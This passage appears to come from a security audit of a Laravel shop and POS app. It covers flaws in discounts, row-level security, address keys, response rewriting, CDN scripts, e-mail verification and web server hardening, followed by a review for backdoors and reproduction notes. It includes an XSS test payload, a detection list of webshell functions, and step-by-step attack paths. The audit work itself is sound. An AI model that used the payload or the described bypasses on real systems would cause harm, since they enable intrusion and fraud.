**Severity:** Medium · **OWASP:** A04 Insecure Design · **CWE:** CWE-840

**Location:** `app/Http/Controllers/Admin/AdminPosController.php:214-263`

**Definition**
`discount` is taken from the request and only clamped to `[0, subtotal]`:

```php
$rawDiscount = (int) ($validated['discount'] ?? 0);
$discount = min($subtotal, max(0, $rawDiscount));
$total = max(0, $subtotal - $discount);
```

The order is then created with `payment_status = PAYMENT_PAID` and `total` equal to the discounted amount. There is no permission check, approval threshold, reason code, or audit entry for the discount.

**Impact**
A cashier can complete a ₹50,000 sale at ₹0, take cash from the customer, and record a zero-value order — with no manager approval or trail. Shift reconciliation will still balance because `expected_cash` is computed from recorded orders.

**Remediation**
Limit discounts to a configurable percentage for `pos.access`; require `pos.discount.override` (manager) above the threshold; store `discount_reason`, `approved_by` and the original subtotal; emit an audit log/report for all discounts above a nominal amount.

---

## M-08 — Row-Level Security is bypassed by ungrouped `orWhere()`

**Severity:** Medium (defence-in-depth; currently masked) · **OWASP:** A01 Broken Access Control · **CWE:** CWE-863 (incorrect authorization)

**Locations**

- `app/Models/Scopes/RowLevelSecurityScope.php:44-65` — adds `where(owner_column, user_id)` or `whereNull(...)`
- `app/Http/Controllers/StorefrontController.php:475-478` — `Order::...->where('id',$order)->orWhere('reference',$order)`
- `app/Http/Controllers/PaymentWebhookController.php:174` — `Order::where('reference',$txnId)->orWhere('payment_reference',$txnId)`
- `app/Models/Coupon.php:72-84` — similar OR grouping pattern

**Definition**
The global scope appends a clause without grouping. With an `OR` added by the caller, SQL precedence produces:

```sql
WHERE user_id = ? AND id = ? OR reference = ?
-- equivalent to: (user_id = ? AND id = ?) OR (reference = ?)
```

so the `reference` branch is evaluated across **all** users/guests, bypassing the RLS boundary. `orderConfirmation()` currently mitigates this with a manual owner/admin/session check (`:480-492`), and webhooks are signature-protected, but the scope itself is not doing what it claims.

**Impact**
Any future or refactored query using `orWhere` on an RLS model can leak other customers' orders/addresses without an obvious code smell. It also weakens the value of the RLS layer in security assessments and tests.

**Remediation**
Wrap RLS in a nested closure: `$builder->where(fn ($q) => $q->where(...))`, and require callers to wrap OR groups in `where(fn ($q) => $q->where(...)->orWhere(...))`. Add a query-log test asserting every `Order` query contains a grouped owner predicate. Audit remaining `orWhere` usages on RLS models.

---

## M-09 — `saveAddress` accepts a client-supplied primary key

**Severity:** Low · **OWASP:** A04 Insecure Design · **CWE:** CWE-20, CWE-639

**Location:** `app/Http/Controllers/StorefrontController.php:756-793`

**Definition**

```php
$address = CustomerAddress::updateOrCreate(
    ['id' => $validated['id'] ?? null, 'user_id' => $user->id],
    [ ...validated address fields... ]
);
```

When `id` belongs to another user, the lookup fails (`user_id` mismatch) and Eloquent attempts an INSERT that includes the explicit `id`, causing a duplicate-key 500. A free/attacker-chosen `id` can also be written as the new primary key.

**Impact**
- Unauthenticated-ish DoS/error noise for any authenticated customer (500 on crafted input).
- Arbitrary PK insertion can collide with future auto-increment values or break assumptions in related tables.
- It also hides the intended “update only my address” semantics.

**Remediation**
Resolve the model first (`CustomerAddress::where('user_id', $user->id)->find($id)`), `abort(404)` if not found, then `update()`/`create()` without `id` in the attributes. Add a feature test for a foreign address ID.

---

## M-10 — `EnsurePlatformBranding` silently rewrites every HTML response

**Severity:** Medium (suspicious mechanism / integrity) · **OWASP:** A08 Software & Data Integrity Failures, A05 Security Misconfiguration · **CWE:** CWE-829 (inclusion of functionality from untrusted control sphere), CWE-693

**Location:** `app/Http/Middleware/EnsurePlatformBranding.php:35-92` (registered globally in `bootstrap/app.php`)

**Definition**
On every successful `text/html` response (except `api/*` and `_debugbar/*`) the middleware searches the body and:

1. Replaces the content of any `data-nexon-platform-branding` element if the attribution text is missing.
2. If the string `Powered by Nex-on` is absent, injects a fixed badge before `</footer>`, before `</body>`, or at the end of the document.

```php
View::share('platformBrandingHtml', '<span ... data-nexon-platform-branding="verified">' . e(self::BRANDING_WRITEUP) . '</span>');
...
if (! str_contains($content, self::PLATFORM_BRANDING)) {
    $badge = '<div class="project-nexon-badge" style="...">...';
    $content = preg_replace('/(<\/footer>)/i', $badge . '$1', $content, 1);
    ...
}
```

**Impact**
- Unexpected runtime mutation of all storefront/admin HTML: it can corrupt markup, break strict CSP hashes/signatures, produce invalid nesting inside `<footer>`/`<body>`, and interfere with tests/snapshots.
- It overrides the site owner's design/content without an audit trail — a hidden “vendor lock-in” mechanism that is easy to misread as a backdoor during an audit.
- Since it injects inline `style` attributes, it depends on `style-src 'unsafe-inline'` continuing to be allowed.

**Remediation**
Remove the middleware. Render attribution explicitly in the footer Blade template (a one-line component), controlled by a setting if required. If a contractual badge is required, do it at the view layer, not by regex-rewriting responses. Add tests that assert the footer output only.

---

## L-01 — CDN scripts without Subresource Integrity

**Severity:** Low · **OWASP:** A05 Security Misconfiguration, A08 Software & Data Integrity Failures · **CWE:** CWE-829, CWE-353 (missing support for integrity check)

**Locations:** `app/Http/Middleware/SecurityHeadersMiddleware.php:45` allows `cdn.jsdelivr.net`, `cdn.tailwindcss.com`, `cdnjs.cloudflare.com`, `googletagmanager.com`, `connect.facebook.net`; layouts load scripts from these origins without `integrity`/`crossorigin`.

**Impact**
A compromised CDN, DNS hijack, or malicious third-party script can execute in the storefront/admin origin, read CSRF tokens and perform actions. CSP cannot stop allowed origins.

**Remediation**
Self-host critical JS (Tailwind, Alpine, icon packs), add SRI + `crossorigin="anonymous"` where CDN use is unavoidable, pin versions, and remove origins from `script-src`.

---

## L-02 — No e-mail verification enforcement

**Severity:** Low · **OWASP:** A07 Identification & Authentication Failures · **CWE:** CWE-620

**Locations**

- `app/Models/User.php:5` — `MustVerifyEmail` is commented out; `class User extends Authenticatable`
- `routes/auth.php:34-220` — login has no `verified` check; registration (`:312-319`) sets no `email_verified_at`
- `app/Http/Controllers/ProfileController.php:56-62` — the verification call is guarded by `instanceof MustVerifyEmail`, so it never runs

**Impact**
Anyone can register with an arbitrary e-mail (including another person's), log in, place orders, and receive order notifications; changing the account e-mail is not verified. This enables impersonation, spam/abuse, and unreliable transactional e-mail.

**Remediation**
Implement `MustVerifyEmail`, send verification on registration, add the `verified` middleware to checkout/account routes (or at least require verification before ordering), and re-verify on e-mail change.

---

## L-03 — Hardening relies on Apache `.htaccess` only

**Severity:** Low (deployment) · **OWASP:** A05 Security Misconfiguration · **CWE:** CWE-16

**Locations**

- `.htaccess` (root) — blocks `.env`, `artisan`, `composer.*`, `app/`, `storage/`, `vendor/`, etc.
- `public/images/.htaccess` — `php_flag engine off` + extension deny list
- `public/.htaccess` — front-controller rewrite only

**Definition**
All of the above are Apache-only. The docs/repo support deploying the app root as the document root on shared hosting; on Nginx, `.htaccess` is ignored, so a misconfigured document root would expose `.env`, `storage/`, `database/`, or allow PHP execution in `public/images`.

**Impact**
On an Nginx or mis-rooted deployment, source/config/backup files become downloadable and uploaded files may execute — full compromise.

**Remediation**
Ship an Nginx server block (deny dotfiles, deny `app|bootstrap|config|database|resources|routes|storage|tests|vendor`, `location ~ \.php$` restricted to `public/index.php`, `location /images/ { location ~ \.(php|phtml|phar)$ { deny all; } }`), document `public/` as the only document root, and add a deployment check that `.env` returns 404.

---

# 2. Backdoor & suspicious-mechanism analysis

The repository was reviewed specifically for deliberate backdoors, hidden authentication bypasses, remote code execution and covert data exfiltration.

## 2.1 Confirmed backdoor-style / risky mechanisms

| Mechanism | Location | Assessment |
|---|---|---|
| `admin:otp` artisan command | `app/Console/Commands/GetAdminOtpCommand.php:15,27-59` | **Backdoor-style.** Prints a live admin 2FA OTP and mints a new one if expired. Requires host/CLI access, but converts any shell foothold into admin login with no web audit trail. Remove from production. |
| Automatic CSP-nonce injection | `SecurityHeadersMiddleware.php:64-79` | **Security-control bypass.** Any `<script>` placed in the HTML is given the valid nonce; combined with `'unsafe-eval'` and the `new Function` dispatcher, CSP can never stop injected code. |
| `on*` → `data-on*` rewrite + `new Function` | `SecurityHeadersMiddleware.php:75`, `storefront-layout.blade.php:381-417`, `admin/layout.blade.php:1698-1723` | **Hidden script execution path.** Attributes that look inert are executed as code through `new Function`, enabling the quick-view stored XSS (H-03) and defeating CSP. |
| Forced attribution injection | `EnsurePlatformBranding.php:35-92` | **Response tampering.** Rewrites every HTML response and force-reinjects vendor branding; not RCE, but undocumented runtime modification of customer/page output. |
| OTP returned from SMS service | `SmsService::generateAndSendOtp()` returns `['otp' => $otp]`; `AdminSmsController::apiSendOtp()` echoes it when `APP_ENV=local/testing` | **Development backdoor hazard.** A production `.env` left at `local` leaks OTPs in the API response. |
| Driver “fast-path” login | `AdminDeliveryPersonnelController.php:172-176` | Session is granted without OTP when `app()->environment('testing')`. Safe only while `APP_ENV` is correct; a mis-set environment disables driver 2FA. |

## 2.2 Verified clean

- **No webshell / eval / command execution backdoor:** searching `app/`, `routes/`, `config/`, `bootstrap/`, `public/` for `eval`, `assert`, `system`, `shell_exec`, `passthru`, `proc_open`, `popen`, `exec`, `base64_decode`, `gzinflate`, `str_rot13`, `create_function`, `$_REQUEST`, `$_COOKIE` returns only:
  - `ProductImageService.php:184,191` — `@exec()` of `ffmpeg` with `escapeshellcmd()`/`escapeshellarg()` and a config path; input is validated as a real video container before use.
  - `PaymentWebhookController.php:170` — `base64_decode()` of the gateway's base64 payload (spec-required), followed by HMAC/checksum verification.
- **No SQL injection found:** all `whereRaw`/`selectRaw`/`orderByRaw` usages use bindings or constant SQL; search/filter values go through query-builder bindings. CSV exports use `CsvExporter::sanitizeRow()` against formula injection.
- **No open redirect / unsafe `redirect($request->...)`:** all redirects use named routes or constants.
- **CSRF protection:** `bootstrap/app.php` exempts only `webhook/*` (signature-verified endpoints). All state-changing web routes require CSRF.
- **Uploads:** setting/product/category image validators reject SVG; `ProductImageService::storeUpload()` re-encodes raster images to AVIF and rejects polyglot markers; video uploads validate container magic bytes, scan for `<?php`, `<script`, `<svg`, `<html`, `<?xml`, cap size at 20 MB and re-encode via ffmpeg. `public/images/.htaccess` disables PHP and denies script extensions (Apache only — see L-03).
- **Secrets at rest:** payment/SMS secrets are encrypted via `Setting::$encryptedKeys` + `Crypt::encryptString`, masked in the UI, and the update controller refuses to overwrite a secret with a masked placeholder.
- **SSRF:** admin-configurable webhook URLs are validated with `SsrfProtectionService::validateUrl()`/`filterSafeUrls()` and dispatched with a no-redirect, timeout-bounded client; `order_webhook_urls` changes are restricted to super-admin.
- **Server-side commerce logic:** `Order::createFromCheckout()` re-resolves products/variants with `lockForUpdate()`, rejects insufficient stock, recomputes subtotal, coupon discount, shipping, COD fee and tax, and ignores client-supplied totals. Coupon `used_count`/limits are enforced in the same transaction.
- **BOLA checks:** order confirmation (`StorefrontController:480-492`), invoice (`:908-922`) and order requests (`:696-706`) verify owner/admin/session before returning data.
- **Signed storage routes:** Laravel's `storage/{path}` GET/PUT handlers require a valid relative signature; no anonymous file upload/read.
- **No secrets in `.env.example`; `.env` is untracked and absent from history.**
- **No `APP_DEBUG=true`** in the working `.env` or `.env.example`.

---

# 3. OWASP Top 10 (2021) coverage matrix

| OWASP category | Findings |
|---|---|
| **A01 Broken Access Control** | H-05, H-06, H-07, M-08, M-09 |
| **A02 Cryptographic Failures** | C-01, H-04 (plaintext OTP / unsalted phone OTP hash) |
| **A03 Injection** | H-02, H-03 |
| **A04 Insecure Design** | H-01, H-08, M-02, M-03, M-04, M-05, M-07, M-09 |
| **A05 Security Misconfiguration** | H-02, M-06, L-01, L-03 |
| **A06 Vulnerable & Outdated Components** | No confirmed vulnerable dependency in the working tree; `composer.lock`/`package-lock.json` should still be scanned in CI |
| **A07 Identification & Authentication Failures** | C-01, H-04, H-05, M-05, M-06, L-02 |
| **A08 Software & Data Integrity Failures** | H-01, M-01, M-10, L-01 |
| **A09 Security Logging & Monitoring Failures** | Related to H-04 (OTP command not web-audited), H-07 (shift movements mutable), H-06 (password resets partially logged); no central alerting on payment/amount mismatches |
| **A10 Server-Side Request Forgery** | No confirmed SSRF: webhook URLs are validated and the client refuses redirects; keep DNS-rebinding checks in CI |

---

# 4. Remediation priority order

1. **Today:** rewrite git history for the DB dump (C-01) and rotate every credential/PII-related secret.
2. **This week:** fix the XSS + CSP pair (H-02 + H-03) — remove response-body rewriting and `new Function`, escape quick-view data.
3. **This week:** remove `admin:otp`, hash OTPs, hide 2FA secrets/recovery codes behind password confirmation (H-04, H-05).
4. **Before any online sales:** implement amount-bound, idempotent payment confirmation and a real gateway flow (H-01, H-08, M-01).
5. **This sprint:** split RBAC (H-06), add POS ownership/status guards (H-07), validate order states and fix double restock (M-02, M-03), fix the export route (M-04).
6. **Next sprint:** rate-limit and authenticate SMS (M-05), enable `TrustHosts` (M-06), cap/approve POS discounts (M-07), group RLS clauses (M-08), fix address PK handling (M-09).
7. **Hardening:** remove `EnsurePlatformBranding` (M-10), add SRI (L-01), implement e-mail verification (L-02), ship Nginx config (L-03).

---

# 5. Reproduction notes

```bash
# C-01 — dump is still recoverable
git show 5713fcb:database/nexon_db_backup.sql | Select-String "INSERT INTO \`users\`"

# H-01 — amount is never read in any confirmation branch
rg -n "amount|currency|payment_reference|PAYMENT_PAID" app/Http/Controllers/PaymentWebhookController.php

# H-02 — nonce is stamped onto every script
rg -n "preg_replace_callback|unsafe-eval|new Function|data-on" app/Http/Middleware/SecurityHeadersMiddleware.php resources/views/components/storefront-layout.blade.php

# H-03 — unescaped interpolation in quick-view
rg -n 'title="\$\{c\.name\}"|qvSelectSize|innerHTML' resources/views/storefront/{saaya,lumiere}/partials/quick-view.blade.php

# H-04 — OTP command and plaintext compare
rg -n "otp_code|admin:otp|!== \$request->otp" app/Console app/Models/User.php routes/auth.php

# H-05 — secret/QR/recovery codes on profile; 2FA store without password
rg -n "two_factor_secret|recoveryCodes|qrCodeSvgUrl|filled\('password'\)" app/Http/Controllers/ProfileController.php app/Http/Controllers/Auth/TwoFactorAuthenticationController.php

# H-06 — settings.manage owns customers; roles.manage owns payroll
rg -n "Route::middleware\('permission:settings.manage'\)|Route::middleware\('permission:roles.manage'\)|customers/\{customer\}/password|bank-file" routes/web.php

# H-07 — no ownership check in shift actions
rg -n "function show|function recordMovement|function closeShift|function receipt" app/Http/Controllers/Admin/AdminPosShiftController.php app/Http/Controllers/Admin/AdminPosController.php

# M-04 — route order
rg -n "orders/\{order\}|orders/export" routes/web.php

# M-05 — unauthenticated SMS endpoint
rg -n "api/sms/send-otp|throttleKey|'otp'" routes/web.php app/Http/Controllers/Admin/AdminSmsController.php app/Providers/AppServiceProvider.php
```

**Test suggestions**

- Payment: `test_one_payment_id_cannot_confirm_two_orders`, `test_webhook_rejects_amount_mismatch`, `test_duplicate_event_is_idempotent`.
- XSS: store `"` `'` `</button>` `<img src=x onerror=alert(1)>` in `colors.*.name`, `colors.*.hex`, `colors.*.sizes.*.size` and assert no executable attribute/`innerHTML` output.
- 2FA: `test_profile_hides_secret_when_confirmed`, `test_cannot_re_enrol_2fa_without_password`, `test_admin_otp_command_absent_in_production`.
- POS: `test_cashier_cannot_close_another_cashiers_shift`, `test_cannot_record_movement_on_closed_shift`, `test_pos_discount_requires_override_above_limit`.
- RBAC: `test_settings_manager_cannot_view_customer_pii_or_reset_password`, `test_roles_manager_cannot_export_bank_file`.
- Restock: `test_cancel_request_restocks_exactly_once`, `test_admin_cannot_approve_already_approved_request`.
- Routing: `test_orders_export_route_is_reachable`.
